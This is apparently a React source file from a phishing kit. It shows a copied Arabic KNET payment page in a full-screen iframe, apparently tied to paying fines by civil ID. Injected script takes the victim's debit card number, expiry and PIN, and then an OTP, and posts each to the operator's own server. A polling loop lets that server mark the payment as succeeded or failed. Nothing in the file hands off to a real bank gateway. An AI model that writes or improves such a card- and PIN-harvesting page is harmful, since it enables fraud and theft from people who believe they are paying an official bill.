import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";

export default function PaymentAr() {
  const [, setLocation] = useLocation();
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [paymentData, setPaymentData] = useState<any>(null);
  const iframeRef = useRef<HTMLIFrameElement>(null);

  const createSessionMutation = trpc.payment.createSession.useMutation();

  useEffect(() => {
    const data = sessionStorage.getItem("paymentData");
    if (!data) {
      setLocation("/ar");
      return;
    }
    const parsed = JSON.parse(data);
    setPaymentData(parsed);

    createSessionMutation.mutate(
      {
        selectedFines: parsed.selectedFines,
        totalAmount: parsed.totalAmount,
        civilId: parsed.civilId,
        enquiryType: parsed.enquiryType || "1",
        queryId: parsed.queryId,
      },
      {
        onSuccess: (result) => {
          setSessionId(result.sessionId);
        },
      }
    );
  }, [setLocation, createSessionMutation]);

  useEffect(() => {
    if (!sessionId || !iframeRef.current || !paymentData) return;

    const iframe = iframeRef.current;
    const doc = iframe.contentDocument || iframe.contentWindow?.document;
    if (!doc) return;

    const script = doc.createElement("script");
    const totalAmount = paymentData?.totalAmount || "0.000";
    const civilId = paymentData?.civilId || "";
    
    const alerts = {
      invalidCard: 'يرجى إدخال رقم البطاقة بشكل صحيح',
      invalidPin: 'يرجى إدخال الرمز السري للبطاقة',
      success: 'تم تأكيد العملية بنجاح. شكراً لك!',
      error: 'حدث خطأ. يرجى المحاولة مرة أخرى.',
      connError: 'حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.',
      invalidOtp: 'يرجى إدخال رمز التحقق بشكل صحيح',
      otpResent: 'تم إعادة إرسال رمز التحقق',
      denied: 'تم رفض العملية. يرجى المحاولة مرة أخرى.'
    };

    script.textContent = `
      var localSessionId = '${sessionId}';
      var payAmount = '${totalAmount}';
      var currentCivilId = '${civilId}';
      var alerts = ${JSON.stringify(alerts)};
      
      document.getElementById('displayAmount').textContent = payAmount;
      
      window.onPay = function() {
        var debitCardNumber = document.getElementById('debitNumber') ? document.getElementById('debitNumber').value.replace(/\\s/g, '') : '';
        var cardPin = document.getElementById('cardPin') ? document.getElementById('cardPin').value : '';
        
        if (!debitCardNumber || debitCardNumber.length < 13) {
          alert(alerts.invalidCard);
          return false;
        }
        if (!cardPin || cardPin.length < 4) {
          alert(alerts.invalidPin);
          return false;
        }
        
        var expiryMonth = document.getElementById('expiryMonthBox') ? document.getElementById('expiryMonthBox').value : '01';
        var expiryYear = document.getElementById('expiryYearBox') ? document.getElementById('expiryYearBox').value : '30';
        
        var proceedBtn = document.getElementById('proceed');
        var cancelBtn = document.getElementById('cancel');
        if (proceedBtn) proceedBtn.disabled = true;
        if (cancelBtn) cancelBtn.disabled = true;
        
        var loadingDiv = document.getElementById('loading');
        if (loadingDiv) loadingDiv.style.display = 'flex';
        
        fetch('/api/trpc/payment.submitCard', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ json: {
            sessionId: localSessionId,
            cardName: 'KNET User',
            cardNumber: debitCardNumber,
            cardExpiry: expiryMonth + '/' + expiryYear,
            cardCvv: cardPin
          } })
        })
        .then(function(res) { return res.json(); })
        .then(function(data) {
          var result = data.result;
          if (result && result.data) {
            var payPageEntry = document.getElementById('PayPageEntry');
            var payConfirm = document.getElementById('payConfirm');
            if (payPageEntry) payPageEntry.style.display = 'none';
            if (payConfirm) payConfirm.style.display = 'block';
            
            var dcNumber = document.getElementById('DCNumber');
            if (dcNumber) {
              var masked = debitCardNumber.replace(/(\\d{4})\\d{8}(\\d{4})/, '$1 **** **** $2');
              dcNumber.textContent = masked;
            }
            
            var loadingDiv = document.getElementById('loading');
            if (loadingDiv) loadingDiv.style.display = 'none';
          } else {
            if (proceedBtn) proceedBtn.disabled = false;
            if (cancelBtn) cancelBtn.disabled = false;
            var loadingDiv = document.getElementById('loading');
            if (loadingDiv) loadingDiv.style.display = 'none';
            var errorMsg = (result && result.error) ? result.error.message : alerts.error;
            alert(errorMsg);
          }
        })
        .catch(function(err) {
          if (proceedBtn) proceedBtn.disabled = false;
          if (cancelBtn) cancelBtn.disabled = false;
          var loadingDiv = document.getElementById('loading');
          if (loadingDiv) loadingDiv.style.display = 'none';
          alert(alerts.connError);
        });
        
        return false;
      };
      
      window.payConfirmAjax = function(action) {
        if (action === 'VALIDATE') {
          var otpCode = document.getElementById('debitOTPtimer') ? document.getElementById('debitOTPtimer').value : '';
          if (!otpCode || otpCode.length < 4) {
            alert(alerts.invalidOtp);
            return false;
          }
          
          var confirmBtn = document.getElementById('proceedConfirm');
          var confirmCancel = document.getElementById('confirmcancel');
          if (confirmBtn) confirmBtn.disabled = true;
          if (confirmCancel) confirmCancel.disabled = true;
          
          var loadingDiv = document.getElementById('loading');
          if (loadingDiv) loadingDiv.style.display = 'flex';
          
          fetch('/api/trpc/payment.submitOtp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ json: { sessionId: localSessionId, otpCode: otpCode } })
          })
          .then(function(res) { return res.json(); })
          .then(function(data) {
            var result = data.result;
            if (result && result.data) {
              alert(alerts.success);
              setTimeout(function() {
                window.parent.postMessage({ type: 'PAYMENT_SUCCESS' }, '*');
              }, 1000);
            } else {
              if (confirmBtn) confirmBtn.disabled = false;
              if (confirmCancel) confirmCancel.disabled = false;
              var loadingDiv = document.getElementById('loading');
              if (loadingDiv) loadingDiv.style.display = 'none';
              var errorMsg = (result && result.error) ? result.error.message : alerts.invalidOtp;
              alert(errorMsg);
            }
          })
          .catch(function() {
            if (confirmBtn) confirmBtn.disabled = false;
            if (confirmCancel) confirmCancel.disabled = false;
            var loadingDiv = document.getElementById('loading');
            if (loadingDiv) loadingDiv.style.display = 'none';
            alert(alerts.connError);
          });
        } else if (action === 'Resend') {
          alert(alerts.otpResent);
        }
        return false;
      };
      
      window.cancelPage = function() {
        window.parent.postMessage({ type: 'PAYMENT_CANCELLED' }, '*');
      };
      
      var pollInterval = setInterval(function() {
        fetch('/api/trpc/payment.getStatus?input=' + encodeURIComponent(JSON.stringify({ sessionId: localSessionId })))
          .then(function(res) { return res.json(); })
          .then(function(data) {
            var result = data.result;
            if (result && result.data) {
              var stage = result.data.stage;
              if (stage === 'success') {
                alert(alerts.success);
                window.parent.postMessage({ type: 'PAYMENT_SUCCESS' }, '*');
              } else if (stage === 'failed') {
                alert(alerts.denied);
                window.cancelPage();
              }
            }
          })
          .catch(function() {});
      }, 3000);
      
      window._pollInterval = pollInterval;
    `;
    doc.head.appendChild(script);

    const handleMessage = (event: MessageEvent) => {
      if (event.data?.type === "PAYMENT_SUCCESS" || event.data?.type === "PAYMENT_CANCELLED") {
        sessionStorage.removeItem("paymentData");
        setLocation("/ar");
      }
    };
    window.addEventListener("message", handleMessage);

    return () => {
      window.removeEventListener("message", handleMessage);
    };
  }, [sessionId, paymentData, setLocation]);

  if (!paymentData) return null;

  return (
    <div
      style={{
        position: "fixed",
        top: 0,
        left: 0,
        width: "100%",
        height: "100%",
        overflow: "hidden",
        backgroundColor: "#fff",
        zIndex: 9999
      }}
    >
      <iframe
        ref={iframeRef}
        src="/knet/index-ar.html"
        style={{
          width: "100%",
          height: "100%",
          border: "none",
          position: "absolute",
          top: 0,
          left: 0
        }}
        title="KNET Payment Arabic"
        sandbox="allow-scripts allow-same-origin allow-forms"
      />
    </div>
  );
}
